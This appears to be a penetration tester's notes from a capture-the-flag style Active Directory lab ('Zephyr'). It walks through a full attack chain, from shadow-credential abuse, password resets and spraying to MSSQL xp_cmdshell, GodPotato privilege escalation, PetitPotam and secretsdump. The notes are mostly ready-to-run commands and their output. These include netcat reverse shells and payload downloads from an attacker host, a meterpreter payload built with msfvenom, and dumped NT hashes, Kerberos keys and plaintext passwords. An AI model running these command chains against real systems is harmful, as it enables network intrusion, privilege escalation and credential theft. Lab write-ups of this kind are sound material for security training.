
# Whisker
```
❯ python3 pywhisker.py -d "zsm.local" -u "marcus" -p '!QAZ2wsx' --target "ZPH-SVRMGMT1$" --action "list"
[*] Searching for the target account
[*] Target user found: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local
[*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that 
attribute
```

```
❯ python3 pywhisker.py -d "zsm.local" -u "marcus" -p '!QAZ2wsx' --target "ZPH-SVRMGMT1$" --action "add"
[*] Searching for the target account
[*] Target user found: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3c1e9c7a-c6aa-d16b-03bc-7cf76c420697
[*] Updating the msDS-KeyCredentialLink attribute of ZPH-SVRMGMT1$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: PypHyCs4.pfx
[*] Must be used with password: Grk8iZFbToifQhQArekX
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

# PKINITools

##### [](https://github.com/dirkjanm/PKINITtools#gettgtpkinitpy)gettgtpkinit.py
```
❯ python3 gettgtpkinit.py -cert-pfx /home/p3ta/htb/zephyr/pywhisker/PypHyCs4.pfx -pfx-pass Grk8iZFbToifQhQArekX "zsm.local/ZPH-SVRMGMT1$" ./tgt.ccache

2023-11-17 14:06:05,884 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2023-11-17 14:06:05,891 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2023-11-17 14:06:36,082 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2023-11-17 14:06:36,082 minikerberos INFO     c5503e654278140c6047a5e26f32ff21b1a94c65f69c2a2a0d8e1a4073e07d40
INFO:minikerberos:c5503e654278140c6047a5e26f32ff21b1a94c65f69c2a2a0d8e1a4073e07d40
2023-11-17 14:06:36,085 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

```

## Klist
```
❯ klist -c tgt.ccache
Ticket cache: FILE:tgt.ccache
Default principal: ZPH-SVRMGMT1$@ZSM.LOCAL

Valid starting       Expires              Service principal
11/17/2023 14:06:00  11/18/2023 00:06:00  krbtgt/ZSM.LOCAL@ZSM.LOCAL

```

##  getnthash.py
```
❯ python3 getnthash.py zsm.local/ZPH-SVRMGMT1$ -key c5503e654278140c6047a5e26f32ff21b1a94c65f69c2a2a0d8e1a4073e07d40
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
89d0b56874f61ad38bad336a77b8ef2f

```

# BloodyAD

Using Machine account to add Marcus to General Management
```
python3 bloodyAD.py --host 192.168.210.10 -d zsm.local -u "ZPH-SVRMGMT1$" -p :89d0b56874f61ad38bad336a77b8ef2f add groupMember "General Management" marcus
```

Using Marcus to change Jamie's password
```
❯ python3 bloodyAD.py --host 192.168.210.10 -d zsm.local -u "marcus" -p '!QAZ2wsx' set password  jamie 'Password123'
[+] Password changed successfully!
```

Add Jamie to CA Managers

```
❯ python3 bloodyAD.py --host 192.168.210.10 -d zsm.local -u "jamie" -p 'Password123' add groupMember "CA Managers" jamie
[+] jamie added to CA Managers
```


# Password Spray
```
❯ crackmapexec winrm 192.168.210.10-16 -u jamie -p 'Password123'

[Errno 13] Permission denied: '/usr/share/crackmapexec/virtualenvs/envs.toml'
SMB         192.168.210.11  5985   ZPH-SVRMGMT1     [*] Windows 10.0 Build 20348 (name:ZPH-SVRMGMT1) (domain:zsm.local)
SMB         192.168.210.10  5985   ZPH-SVRDC01      [*] Windows 10.0 Build 20348 (name:ZPH-SVRDC01) (domain:zsm.local)
HTTP        192.168.210.11  5985   ZPH-SVRMGMT1     [*] http://192.168.210.11:5985/wsman
HTTP        192.168.210.10  5985   ZPH-SVRDC01      [*] http://192.168.210.10:5985/wsman
SMB         192.168.210.16  5985   ZPH-SVRCDC01     [*] Windows 10.0 Build 20348 (name:ZPH-SVRCDC01) (domain:internal.zsm.local)
SMB         192.168.210.12  5985   ZPH-SVRCA01      [*] Windows 10.0 Build 20348 (name:ZPH-SVRCA01) (domain:zsm.local)
SMB         192.168.210.15  5985   ZPH-SVRSQL01     [*] Windows 10.0 Build 17763 (name:ZPH-SVRSQL01) (domain:zsm.local)
HTTP        192.168.210.12  5985   ZPH-SVRCA01      [*] http://192.168.210.12:5985/wsman
SMB         192.168.210.14  5985   ZPH-SVRADFS1     [*] Windows 10.0 Build 20348 (name:ZPH-SVRADFS1) (domain:zsm.local)
HTTP        192.168.210.16  5985   ZPH-SVRCDC01     [*] http://192.168.210.16:5985/wsman
HTTP        192.168.210.15  5985   ZPH-SVRSQL01     [*] http://192.168.210.15:5985/wsman
HTTP        192.168.210.14  5985   ZPH-SVRADFS1     [*] http://192.168.210.14:5985/wsman
HTTP        192.168.210.11  5985   ZPH-SVRMGMT1     [+] zsm.local\jamie:Password123 (Pwn3d!)
HTTP        192.168.210.10  5985   ZPH-SVRDC01      [-] zsm.local\jamie:Password123 
HTTP        192.168.210.12  5985   ZPH-SVRCA01      [+] zsm.local\jamie:Password123 (Pwn3d!)
HTTP        192.168.210.16  5985   ZPH-SVRCDC01     [-] internal.zsm.local\jamie:Password123 
HTTP        192.168.210.15  5985   ZPH-SVRSQL01     [-] zsm.local\jamie:Password123 
HTTP        192.168.210.14  5985   ZPH-SVRADFS1     [-] zsm.local\jamie:Password123
```
# ZPH-SVRCA01 
192.168.210.12
```
*Evil-WinRM* PS C:\Users\public\Desktop> type flag.txt
ZEPHYR{C0n57r4in3d_d3l3g4710n_1s_d4ng3r0us}
```

```
❯ nmap -T4 -sV -Pn 192.168.210.12
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-18 10:39 PST
Nmap scan report for 192.168.210.12
Host is up (0.14s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds

```

# ZPH-SVRSQL01

## MSSQL
## Impacket-MSSQLclient
```
impacket-mssqlclient zabbix@192.168.210.15
```

Password: rDhHbBEfh35sMbkY

### Listing users

```
SQL> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
login
```

![[Pasted image 20231121073047.png]]

### Impersonate SA
```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![[Pasted image 20231121073713.png]]

### Enumeration
Versions
![[Pasted image 20231121090553.png]]
Linked Servers
![[Pasted image 20231121090637.png]]

### Transfer NC64.exe
```
SQL> xp_cmdshell "powershell iwr http://10.10.14.21/nc64.exe -O C:\users\public\Downloads\nc64.exe"
```

```
xp_cmdshell "C:\Users\Public\Downloads\nc64.exe 10.10.14.21 80 -e cmd.exe"
```
### ReverseShell
```
❯ sudo nc -lvnp 80
Listening on 0.0.0.0 80
Connection received on 10.10.110.35 60070
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Privilege Escalation
```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

## Enumeration
```
C:\Windows\system32>systeminfo
systeminfo

Host Name:                 ZPH-SVRSQL01
OS Name:                   Microsoft Windows Server 2019 Standard

```

## File Transfer Payload

### Printspoofer
```
powershell iwr http://10.10.14.21:443/PrintSpoofer64.exe -O C:\Users\Public\Downloads\ps.exe
```

### God Potato
```
powershell iwr http://10.10.14.21:443/GodPotato-NET4.exe -O C:\Users\Public\Downloads\gp.exe
```

```
C:\Users\Public\Downloads>gp.exe -cmd "cmd /c whoami"
gp.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140708901355520
[*] DispatchTable: 0x140708903661680
[*] UseProtseqFunction: 0x140708903037856
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000cc02-07e8-ffff-eef8-fa2938f9e6eb
[*] DCOM obj OXID: 0xb0383f00015a9686
[*] DCOM obj OID: 0xad2d0adacdfa9d91
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] CreateNamedPipe \\.\pipe\a3624ff8-ce0a-4aa3-8e33-db8d99bbba04\pipe\epmapper
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 760 Token:0x924  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1096
nt authority\system

```

### Exploit
```
C:\Users\Public\Downloads>gp.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.21 443"
```

```
❯ sudo nc -lvnp 443
[sudo] password for p3ta: 
Listening on 0.0.0.0 443
Connection received on 10.10.110.35 52906
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public\Downloads>whoami
whoami
nt authority\system

C:\Users\Public\Downloads>
```

# ZSM-SVRCSQL02
Going back to the linked server
```
EXECUTE ('select @@servername;') at [ZSM-SVRCSQL02];
```

## Enable xp_cmdshell
```
EXECUTE ('EXEC sp_configure "show advanced options",1') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('reconfigure') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('EXEC sp_configure "xp_cmdshell",1') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('reconfigure') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('xp_cmdshell "whoami"') at [ZSM-SVRCSQL02];
```

![[Pasted image 20231121091718.png]]

## RevserseShell
Transfer nc64.exe

```
EXECUTE ('xp_cmdshell "powershell iwr http://10.10.14.21:443/nc64.exe -O C:\users\public\downloads\nc64.exe"') at [ZSM-SVRCSQL02];
```

```
EXECUTE ('xp_cmdshell "c:\users\public\downloads\nc64.exe 10.10.14.21 443 -e cmd.exe"') at [ZSM-SVRCSQL02];
```

```
❯ sudo nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.110.35 5232
Microsoft Windows [Version 10.0.20348.1726]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
internal\mssql_svc
```

```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

## IPconfig
```
C:\Users>ipconfig 
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::8710:aef6:30df:c771%6
   IPv4 Address. . . . . . . . . . . : 192.168.210.19
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.210.1

```

## Privilege Escalation

### Transfer God Potato
```
powershell iwr http://10.10.14.21/GodPotato-NET4.exe -O C:\users\public\downloads\gp.exe

```

### Exploit
```
gp.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.21 80"
```

![[Pasted image 20231121093744.png]]

![[Pasted image 20231121094838.png]]

Run bloodhound on internal.zsm.local and transfer it to your machine

Create a meterpreter payload 

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.21 LPORT=443 -f exe > exploit.exe
```

Get the RS

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5dc71607c06cf83eea0f3d789bce419c:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

## Evil-WINrm
```
evil-winrm -i 192.168.210.19 -u administrator -H 5dc71607c06cf83eea0f3d789bce419c
```

### upload Bloodhound
```
*Evil-WinRM* PS C:\Users\Administrator\desktop\p3ta> download 20231121174616_BloodHound.zip
```

### Clear Text password in description

![[Pasted image 20231121110043.png]]

### Enumerate Domain Users
![[Pasted image 20231121110652.png]]

![[Pasted image 20231121110800.png]]

![[Pasted image 20231121111342.png]]

### Password Spraying

![[Pasted image 20231121112746.png]]

it wouldn't work because of the port being blocked from my ligolo server. I didn't feel like changing the port again, so I just manually attempted to WinRM

![[Pasted image 20231121112847.png]]

![[Pasted image 20231121114923.png]]

![[Pasted image 20231121115122.png]]

Start a listener and execute RunasCs.exe and nc64.exe

```
.\RunAsCs.exe -l 3 aron ToughPasswordToCrack123! -d internal.zsm.local 'c:\users\aron\desktop\nc64.exe 10.10.14.21 443 -e cmd.exe'
```

![[Pasted image 20231121121717.png]]

I ended up changing it to port 443 for stability issues with port 80

## Windows PricscCheck

```
powershell -ep bypass -c ". .\pc.ps1; Invoke-PrivescCheck"
```
![[Pasted image 20231122073132.png]]

Run this in the shell that you created earlier

```
sc stop wuauserv
```

```
sc start wuauserv
```

```
sc config wuauserv binPath= "net localgroup Administrators aron /add"
```

![[Pasted image 20231122075443.png]]
# ZPH-SVRCSUP

![[Pasted image 20231122080825.png]]

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> $user = 'internal\melissa'
*Evil-WinRM* PS C:\Users\Administrator\desktop> $passwd = 'WinterIsHere2022!'
*Evil-WinRM* PS C:\Users\Administrator\desktop> $secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
*Evil-WinRM* PS C:\Users\Administrator\desktop> $cred = new-object system.management.automation.PSCredential $user,$secpass
*Evil-WinRM* PS C:\Users\Administrator\desktop> Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock {type c:\users\administrator\desktop\flag.txt}
ZEPHYR{D0n7_f0rg3t_Imp0rt4nt_Inf0rm4710n}
```

```
$user = 'internal\melissa'
```
```
$passwd = 'WinterIsHere2022!'
```
```
$secpass = ConvertTo-SecureString $passwd -AsPlainText -Force
```
```
$cred = new-object system.management.automation.PSCredential $user,$secpass
```


```
Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock { powershell iwr http://10.10.14.21/RunasCs.exe -O C:\Users\melissa\documents\RunasCs.exe }
```

```
Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock { powershell iwr http://10.10.14.21/nc64.exe -O C:\Users\melissa\documents\nc64.exe }
```

```
Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock {C:\Users\melissa\documents\RunAsCs.exe -l 2 melissa WinterIsHere2022! -d internal.zsm.local "C:\Users\melissa\documents\nc64.exe 10.10.14.21 443 -e cmd.exe"}
```

![[Pasted image 20231122082721.png]]

```
Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock { powershell iwr http://10.10.14.21/exploit.exe -O C:\Users\melissa\documents\exploit.exe }
```

```
Invoke-Command -ComputerName ZPH-SVRCSUP -Credential $cred -ScriptBlock {C:\Users\melissa\documents\RunAsCs.exe -l 2 melissa WinterIsHere2022! -d internal.zsm.local "dir C:\Users\melissa\documents"}
```

```
.\bo.exe -t \\ZPH-SVRCDC01.internal.zsm.local -u melissa -p WinterIsHere2022! -d internal.zsm.local -o \\10.10.14.21\share\
```

```
cd c:\users\melissa\documents
```

# non of this worked, but keep for notes.

## PetitPotam
```
python3 PetitPotam.py -d internal.zsm.local -u melissa -p 'WinterIsHere2022!' 10.10.14.21 192.168.210.16

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.210.16[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!

```

```
❯ sudo impacket-smbserver share ~/test -smb2support
[sudo] password for p3ta: 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.110.35,26314)
[*] AUTHENTICATE_MESSAGE (internal\ZPH-SVRCDC01$,ZPH-SVRCDC01)
[*] User ZPH-SVRCDC01\ZPH-SVRCDC01$ authenticated successfully
[*] ZPH-SVRCDC01$::internal:aaaaaaaaaaaaaaaa:dd67b2112aecef0d3d2d6567c46217b8:01010000000000008011383f711dda014aea485021e7662400000000010010006300550063007900450064004b005900030010006300550063007900450064004b00590002001000550049006200510078004f005400640004001000550049006200510078004f0054006400070008008011383f711dda01060004000200000008003000300000000000000000000000004000008283bf68e059340a0a66381d741989240e9aeb3d2d413f850e9b0fee729062c40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320031000000000000000000
[*] Closing down connection (10.10.110.35,26314)
[*] Remaining connections []
[*] Incoming connection (10.10.110.35,20993)
[*] AUTHENTICATE_MESSAGE (internal\ZPH-SVRCDC01$,ZPH-SVRCDC01)
[*] User ZPH-SVRCDC01\ZPH-SVRCDC01$ authenticated successfully
[*] ZPH-SVRCDC01$::internal:aaaaaaaaaaaaaaaa:3a7a765ce525d22b322f437ff91f22e2:01010000000000008011383f711dda01d58bfb99c0f74ee100000000010010006300550063007900450064004b005900030010006300550063007900450064004b00590002001000550049006200510078004f005400640004001000550049006200510078004f0054006400070008008011383f711dda01060004000200000008003000300000000000000000000000004000008283bf68e059340a0a66381d741989240e9aeb3d2d413f850e9b0fee729062c40a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320031000000000000000000
[*] Closing down connection (10.10.110.35,20993)
[*] Remaining connections []
```

THis also did not work.

## Reg.py
```
https://github.com/horizon3ai/backup_dc_registry
```

### SMB Server
```
sudo impacket-smbserver share ~/test -smb2support
```

### Reg.py
```
 python3 reg.py internal.zsm.local/melissa@192.168.210.16 backup -p '\\10.10.14.21\share\' -verbose
```

### Secrets Dump
```
impacket-secretsdump LOCAL -system SYSTEM -sam SAM -security SECURITY
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0xb1223a009047a376c120c3630a0f0e48
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5bdd6a33efe43f0dc7e3b2435579aa53:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:dc66f30d3e8bd48b4bfb9c3f53eb66ebda1edbb7af476a9f7650476edce03326b61fabe212dfd9e6c2e06eaaffcab3c78cfd4f47cd564ef53e8eb5d855f9e998c34c5fabc5e713559e090d6e5dc149a97ed653608d5cd07864d7774f2d766512849d4fafff4030324173ccd8cb8c6a1513a348a337c6d46778e4e37bc2e2c2e369626f1f153bdf391f8c175fdae042537016a2198b8c120c738854c907a1ddddcb88aaa517af97bcee783d1d9a36ddc179f2bb5cc8a336a00863183c96384434bb9a8eee781822f51d2727cd14e3fd0841edfa7004eefa2a8e3327b457f34587642e1e91e79a24590d97b8ad6cb14ee7
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf108ba9fcd3554a2abb82ff4a8d29f0679aeaae6
dpapi_userkey:0xe57f2322d588ce987f04d6a3b1bf31cfa35d050a
[*] NL$KM 
 0000   07 E9 F2 3F 08 49 46 07  02 CE 30 4B 65 D3 86 32   ...?.IF...0Ke..2
 0010   6F 02 5D 36 7D E8 30 33  F4 71 94 44 98 37 CB 1A   o.]6}.03.q.D.7..
 0020   05 CC 76 F1 26 E2 94 E7  D3 54 78 1F EF BE E9 13   ..v.&....Tx.....
 0030   30 3B 62 CB A5 57 75 E6  78 F3 D4 55 5C 68 20 15   0;b..Wu.x..U\h .
NL$KM:07e9f23f0849460702ce304b65d386326f025d367de83033f47194449837cb1a05cc76f126e294e7d354781fefbee913303b62cba55775e678f3d4555c682015
[*] Cleaning up... 

```

```
impacket-secretsdump 'internal.zsm.local/ZPH-SVRCDC01$'@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0540fe51ddd618f42a66ef059ac36441:::
internal.zsm.local\mssql_svc:6101:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Emily:6601:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Laura:6602:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Melissa:6603:aad3b435b51404eeaad3b435b51404ee:184260f5bf16a77d67a9d540fda79495:::
internal.zsm.local\Sarah:6604:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Amy:6605:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Steven:6606:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Malcolm:6607:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Aron:6608:aad3b435b51404eeaad3b435b51404ee:8cb21ab7f3ee6d782c724216bd88d1d1:::
internal.zsm.local\Matt:6609:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
internal.zsm.local\Jamie:6610:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
ZPH-SVRCDC01$:1000:aad3b435b51404eeaad3b435b51404ee:d47a6d90e1c5adf4200227514e393948:::
ZPH-SVRCHR$:1601:aad3b435b51404eeaad3b435b51404ee:06e402102d72956c62a63794a999935e:::
ZPH-SVRCSUP$:1602:aad3b435b51404eeaad3b435b51404ee:36e7d551e7cb15ca7dad3fd851fc707f:::
ZSM-SVRCSQL02$:5601:aad3b435b51404eeaad3b435b51404ee:ad854719bbb6fc1664316a14cc6eb88d:::
INT-MAINT$:6102:aad3b435b51404eeaad3b435b51404ee:8c0aff2e562402c147dc9650b1eb86cb:::
ZSM$:1103:aad3b435b51404eeaad3b435b51404ee:3b27177e3a7db14398cbbd9bbb7ba315:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:fbbb5e79da10a8b4609429942c12329391e4af7213e69560893b81c421375f0b
Administrator:aes128-cts-hmac-sha1-96:1f50b00b725eb4ed09a3def4e75ec9f0
Administrator:des-cbc-md5:439ed652fe5b38ae
krbtgt:aes256-cts-hmac-sha1-96:3bdcbeb0910e5887e6d6c7fbec6c3f29e1e099322ac91cc386ca296a5c5497b0
krbtgt:aes128-cts-hmac-sha1-96:b6252a6e5ec060751a03c1a73ef2af4e
krbtgt:des-cbc-md5:92755ef7ce8a6e16
internal.zsm.local\mssql_svc:aes256-cts-hmac-sha1-96:bea9de16d6775f6ed646cf8e002b2e6845e219f080a709410cb600f909d105ff
internal.zsm.local\mssql_svc:aes128-cts-hmac-sha1-96:4df91cf757b8cb7c5f6e544236293c8d
internal.zsm.local\mssql_svc:des-cbc-md5:5bdf199ee546e6f8
internal.zsm.local\Emily:aes256-cts-hmac-sha1-96:6fac0f47c747960e583ab9cb6d93c31a9425f9a921d246766c2d1a798e10fb56
internal.zsm.local\Emily:aes128-cts-hmac-sha1-96:fbba2f446451e35dd9cbf1d376580e1f
internal.zsm.local\Emily:des-cbc-md5:fd374cc262ec9201
internal.zsm.local\Laura:aes256-cts-hmac-sha1-96:bf6a8feea25df8f1640143c2dc26bc76128748962aef3d5e1c315b8bc7acc8c0
internal.zsm.local\Laura:aes128-cts-hmac-sha1-96:b994efccf32f7827c5ec3a43126a1118
internal.zsm.local\Laura:des-cbc-md5:add68cc23470b0f8
internal.zsm.local\Melissa:aes256-cts-hmac-sha1-96:b09d86e2e6480c2122ee1383f24e592a9642e16470a82bdeb9fff6875d41a922
internal.zsm.local\Melissa:aes128-cts-hmac-sha1-96:289e6d2c65f84c94f185e9755708cf3b
internal.zsm.local\Melissa:des-cbc-md5:982a25f7dc4cb3e9
internal.zsm.local\Sarah:aes256-cts-hmac-sha1-96:81028d54164a46107a6f6b9b0ac9a9216aee0e8d4bce82a3c668d5e1f16774c5
internal.zsm.local\Sarah:aes128-cts-hmac-sha1-96:d130b796b81c66348bc67a95029a19c7
internal.zsm.local\Sarah:des-cbc-md5:29ceaeb664bc2f9e
internal.zsm.local\Amy:aes256-cts-hmac-sha1-96:940adf4174eaaa50218561b87644cdf0210cdecb40ee5b6672312ef39e7f4390
internal.zsm.local\Amy:aes128-cts-hmac-sha1-96:655645f7b62f9d073a00ef7142c8da33
internal.zsm.local\Amy:des-cbc-md5:49e0d6bfd69868b6
internal.zsm.local\Steven:aes256-cts-hmac-sha1-96:9adcb602c37ce0ee4894d74a6575a6f70f7430e8e00446bc0850b787089c4cc4
internal.zsm.local\Steven:aes128-cts-hmac-sha1-96:e9731b435a8651cf11d52d71df936385
internal.zsm.local\Steven:des-cbc-md5:5dce8a52b389e5a2
internal.zsm.local\Malcolm:aes256-cts-hmac-sha1-96:f6e7d8a35afb386c1c271d6a53af85fcf8e306d36f281fdfc2c477c353f62c91
internal.zsm.local\Malcolm:aes128-cts-hmac-sha1-96:4bac2835d8be32ad5dd585ceb7450ef3
internal.zsm.local\Malcolm:des-cbc-md5:26b331256d2fbcd9
internal.zsm.local\Aron:aes256-cts-hmac-sha1-96:957fd600878eaad5dba70443e42d6a647b0b393211da3e62e55ef5bff965d9bb
internal.zsm.local\Aron:aes128-cts-hmac-sha1-96:26ef49f42cb51e023b50c84e360399eb
internal.zsm.local\Aron:des-cbc-md5:91cef44fc119f119
internal.zsm.local\Matt:aes256-cts-hmac-sha1-96:1877cc1d57a84d334b4a07a77c80086dfb76abe997f0339307efb32429b0deee
internal.zsm.local\Matt:aes128-cts-hmac-sha1-96:a4007666551eebd71856c6833faed374
internal.zsm.local\Matt:des-cbc-md5:2a4a5b467f9bb919
